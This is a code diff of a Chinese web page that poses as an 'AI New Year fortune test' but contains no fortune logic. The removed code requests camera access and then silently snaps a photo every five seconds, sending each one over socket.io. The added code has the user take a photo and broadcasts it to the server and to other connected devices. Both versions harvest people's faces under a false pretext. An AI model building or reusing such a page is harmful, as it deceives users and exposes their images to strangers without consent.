@@ -3,66 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI测试</title>
+    <title>专业AI测试新年运势</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
 </head>
 <body>
-    <h1>专业AI测试运势</h1>
-
-    <!-- 本地视频元素 -->
-    <video id="localVideo" width="320" height="240" autoplay></video>
+    <h1>专业AI测试你的新年运势</h1>
 
     <!-- 显示照片的元素 -->
     <img id="remotePhoto" width="320" height="240">
 
     <!-- 请求摄像头权限按钮 -->
-    <button id="requestPermissionBtn">请求摄像头权限</button>
+    <button id="takePhotoBtn">拍照</button>
 
     <script>
-        const localVideo = document.getElementById('localVideo');
         const remotePhoto = document.getElementById('remotePhoto');
-        const requestPermissionBtn = document.getElementById('requestPermissionBtn');
+        const takePhotoBtn = document.getElementById('takePhotoBtn');
+        const socket = io();
 
-        let socket;
-
-        // 请求摄像头权限
-        requestPermissionBtn.addEventListener('click', () => {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-                .then((stream) => {
-                    // 将本地视频流显示在本地视频元素上
-                    localVideo.srcObject = stream;
-
-                    // 启动WebSocket连接
-                    socket = io();
-
-                    // 监听来自远程用户的照片数据
-                    socket.on('photo', (dataUrl) => {
-                        // 显示远程用户的照片
-                        remotePhoto.src = dataUrl;
-                    });
-
-                    // 定时拍摄并发送照片
-                    setInterval(() => {
-                        captureAndSendPhoto(stream);
-                    }, 5000);  // 每5秒拍摄一次照片，你可以调整这个间隔
-                })
-                .catch((error) => {
-                    console.error('获取摄像头权限失败:', error);
-                });
+        takePhotoBtn.addEventListener('click', () => {
+            // 触发手机摄像头拍照
+            capturePhoto();
         });
 
-        function captureAndSendPhoto(stream) {
-            // 创建一个画布，将视频帧绘制到画布上
-            const canvas = document.createElement('canvas');
-            canvas.width = localVideo.videoWidth;
-            canvas.height = localVideo.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(localVideo, 0, 0, canvas.width, canvas.height);
-
-            // 将画布上的内容转为DataURL形式的图像，并发送给远程用户
-            const imageDataUrl = canvas.toDataURL('image/png');
-            socket.emit('photo', imageDataUrl);
+        function capturePhoto() {
+            // 使用input元素选择文件的方式触发拍照
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = 'image/*';
+            input.capture = 'camera';
+            input.addEventListener('change', handleFileSelect, false);
+            input.click();
         }
+
+        function handleFileSelect(event) {
+            const file = event.target.files[0];
+
+            if (file) {
+                // 读取文件内容
+                const reader = new FileReader();
+                reader.onload = function (e) {
+                    const imageDataUrl = e.target.result;
+
+                    // 显示照片
+                    remotePhoto.src = imageDataUrl;
+
+                    // 发送照片给其他设备
+                    socket.emit('photo', imageDataUrl);
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        // 监听来自其他设备的照片数据
+        socket.on('photo', (dataUrl) => {
+            // 显示其他设备的照片
+            remotePhoto.src = dataUrl;
+        });
     </script>
 </body>
 </html>
